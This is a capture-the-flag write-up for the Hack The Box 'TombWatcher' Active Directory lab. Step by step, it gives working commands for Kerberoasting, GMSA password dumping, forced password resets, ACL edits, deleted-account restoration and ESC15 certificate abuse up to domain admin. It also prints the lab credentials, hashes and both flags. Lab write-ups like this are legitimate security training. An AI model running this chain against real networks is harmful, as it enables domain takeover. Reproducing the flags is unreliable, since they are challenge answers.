# HTB: TombWatcher - Writeup

![HTB TombWatcher](https://labs.hackthebox.com/storage/avatars/59c74a969b4fec16cd8072d253ca9917.png)

## Overview

TombWatcher is a pure Active Directory challenge that demonstrates complex privilege escalation through multiple AD attack vectors. Starting with initial credentials, I'll perform targeted Kerberoasting, abuse group memberships, exploit Group Managed Service Accounts (GMSA), manipulate object ownership, restore deleted AD objects, and finally achieve domain admin through certificate template exploitation (CVE-2024-49019).

## Box Information

| Attribute      | Value               |
| -------------- | ------------------- |
| **Name**       | TombWatcher         |
| **OS**         | Windows Server 2019 |
| **Difficulty** | Medium              |


## Initial Access

**Starting Credentials:**
- Username: `henry`
- Password: `H3nry_987TGV!`

*Note: These credentials were provided as part of the challenge setup.*

## Reconnaissance

### Nmap Scan

```bash
nmap -sTVC -T5 10.10.11.72 -oA nmap/tombwatcher
```

**Key Open Ports:**
- 53/tcp (DNS) - Simple DNS Plus
- 80/tcp (HTTP) - Microsoft IIS httpd 10.0
- 88/tcp (Kerberos) - Microsoft Windows Kerberos
- 135/tcp (MSRPC) - Microsoft Windows RPC
- 389/tcp (LDAP) - Microsoft Windows Active Directory LDAP
- 445/tcp (SMB) - Microsoft-DS
- 5985/tcp (WinRM) - Microsoft HTTPAPI httpd 2.0

**Domain Information:**
- Domain: `tombwatcher.htb`
- Domain Controller: `DC01.tombwatcher.htb`

### Initial Credential Validation

```bash
# Add domain to hosts file
echo "10.10.11.72 tombwatcher.htb DC01.tombwatcher.htb" >> /etc/hosts

# Validate SMB access
netexec smb tombwatcher.htb -u henry -p 'H3nry_987TGV!'
```
 SMB access confirmed for henry.

## Attack Chain

### 1. User Enumeration

```bash
# Enumerate domain users
netexec smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users
```

**Domain Users Found:**
- Administrator, Henry, Alfred, sam, john, cert_admin

### 2. Bloodhound Enumeration

```bash
# Collect Bloodhound data
bloodhound-python -d tombwatcher.htb -c all -u henry -p H3nry_987TGV! -ns 10.10.11.72 --zip
```

**Key Bloodhound Findings:**
- Henry has `WriteSPN` over Alfred
- Alfred can add himself to `INFRASTRUCTURE` group
- `INFRASTRUCTURE` group can read GMSA password for `ANSIBLE_DEV$`
- `ANSIBLE_DEV$` has `ForceChangePassword` over sam
- sam has `WriteOwner` over john

### 3. Targeted Kerberoasting: Henry → Alfred

**Attack:** Abuse GenericWrite to perform targeted Kerberoasting

```bash
# Execute targeted kerberoast attack
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

**Output:**
```
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$77c5d012...
```

### 4. Cracking Alfred's Hash

```bash
# Crack the TGS hash
hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
```

**Alfred's Password:** `basketball`

### 5. Group Membership Abuse: Alfred → Infrastructure

**Attack:** Add Alfred to Infrastructure group

```bash
# Add Alfred to Infrastructure group
bloodyAD -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember "INFRASTRUCTURE" "alfred"

# Verify membership
net rpc group members "INFRASTRUCTURE" -U "tombwatcher.htb"/"alfred"%"basketball" -S "dc01.tombwatcher.htb"
```

 Alfred successfully added to Infrastructure group.

### 6. GMSA Password Retrieval

**Attack:** Abuse Infrastructure group membership to read GMSA password

```bash
# Dump GMSA password
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
```

**GMSA Credentials:**
- `ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc`

### 7. Password Reset: ANSIBLE_DEV$ → sam

**Attack:** Use GMSA account to reset sam's password

```bash
# Reset sam's password
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'ansible_dev$' -p :1c37d00093dc2a5f25176bf2d474afdc set password 'SAM' 'Password123!'
```

### 8. Owner Manipulation: sam → john

**Attack:** Abuse WriteOwner to take control of john's object

```bash
# Change john's owner to sam
impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb'/'sam':'Password123!' -dc-ip 10.10.11.72

# Grant WriteMembers permission
impacket-dacledit -action write -rights 'WriteMembers' -principal "john" -target-dn "CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB" 'tombwatcher.htb'/'sam':'Password123!' -dc-ip 10.10.11.72

# Grant GenericAll permission
bloodyAD --host 10.10.11.72 -d "tombwatcher.htb" -u "sam" -p 'Password123!' add genericAll "john" "sam"

# Reset john's password
bloodyAD --host 10.10.11.72 -d "tombwatcher.htb" -u "sam" -p 'Password123!' set password "john" 'johnny123'
```

### 9. Shell as John

```bash
# Verify WinRM access
netexec winrm 10.10.11.72 -u john -p johnny123

# Connect via WinRM
evil-winrm -i 10.10.11.72 -u john -p johnny123
```

🚩 **User Flag:** `d98cc58dac105adce49958f46bc6fdda`

### 10. AD Object Recovery

**Discovery:** Found deleted cert_admin objects

```powershell
# Find deleted objects
Get-ADObject -filter {SamAccountName -eq 'cert_admin'} -IncludeDeletedObjects

# Restore specific cert_admin object
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

# Enable the restored account
Enable-ADAccount -Identity cert_admin

# Set password for cert_admin
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

### 11. Certificate Template Vulnerability Analysis

```bash
# Scan for vulnerable certificate templates
certipy find -u cert_admin@tombwatcher.htb -p 'Password123!' -dc-ip 10.10.11.72 -vulnerable
```

**Vulnerability Found:**
- **Template:** WebServer
- **Vulnerability:** ESC15 (CVE-2024-49019)
- **Issue:** Enrollee supplies subject and schema version is 1

### 12. Certificate-Based Privilege Escalation

**Attack:** Exploit ESC15 to impersonate Administrator

```bash
# Request certificate with administrator UPN
certipy req -dc-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -target-ip 10.10.11.72 \
-u cert_admin@tombwatcher.htb -p 'Password123!' \
-template WebServer \
-upn administrator@tombwatcher.htb \
-application-policies 1.3.6.1.5.5.7.3.2

# Authenticate and reset administrator password
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -domain tombwatcher.htb -ldap-shell
# change_password administrator Password123!
```

### 13. Domain Administrator Shell

```bash
# Connect as Administrator
evil-winrm -i 10.10.11.72 -u administrator -p Password123!
```

🚩 **Root Flag:** `297a39d498d6f8d29aac9f3007a763b0`

## Attack Summary

```
henry (initial creds)
    ↓ GenericWrite + Targeted Kerberoasting
alfred (cracked TGS)
    ↓ Add to Infrastructure Group
GMSA Password Access
    ↓ ANSIBLE_DEV$ Impersonation
sam (password reset)
    ↓ WriteOwner + Object Manipulation
john (full control)
    ↓ AD Object Recovery
cert_admin (restored account)
    ↓ Certificate Template Exploitation (ESC15)
Administrator (domain compromise)
```

## Key Techniques Used

1. **Active Directory Enumeration** - Bloodhound data collection and analysis
2. **Targeted Kerberoasting** - GenericWrite to SPN abuse
3. **Group Membership Manipulation** - Adding users to privileged groups
4. **GMSA Password Extraction** - Group Managed Service Account abuse
5. **Object Ownership Manipulation** - WriteOwner privilege abuse
6. **DACL Modification** - Permission escalation via ACL manipulation
7. **AD Object Recovery** - Restoring deleted Active Directory objects
8. **Certificate Template Exploitation** - ESC15 (CVE-2024-49019) abuse

## Vulnerabilities Exploited

- **CVE-2024-49019** - Active Directory Certificate Services ESC15
- **Misconfigured AD Permissions** - Excessive GenericWrite/WriteOwner rights
- **GMSA Security Gaps** - Improper group membership controls
- **Deleted Object Recovery** - Insufficient deletion policies

## Tools Used

- `netexec` - SMB/WinRM enumeration and validation
- `bloodhound-python` - Active Directory data collection
- `targetedKerberoast.py` - Targeted Kerberoasting attack
- `hashcat` - Hash cracking
- `bloodyAD` - Active Directory manipulation
- `gMSADumper.py` - GMSA password extraction
- `impacket-owneredit` - Object ownership modification
- `impacket-dacledit` - DACL manipulation
- `certipy` - Certificate Services enumeration and exploitation
- `evil-winrm` - Windows Remote Management shells

## Pwned

[THE HTB TOMBWATCHER BOX](https://www.hackthebox.com/achievement/machine/1390647/664)

**Author:** 0xdf-sec  
**Date:** June 11, 2025  
**Tags:** `hackthebox` `active-directory` `bloodhound` `kerberoasting` `gmsa` `certificate-services` `esc15` `cve-2024-49019` `object-recovery`
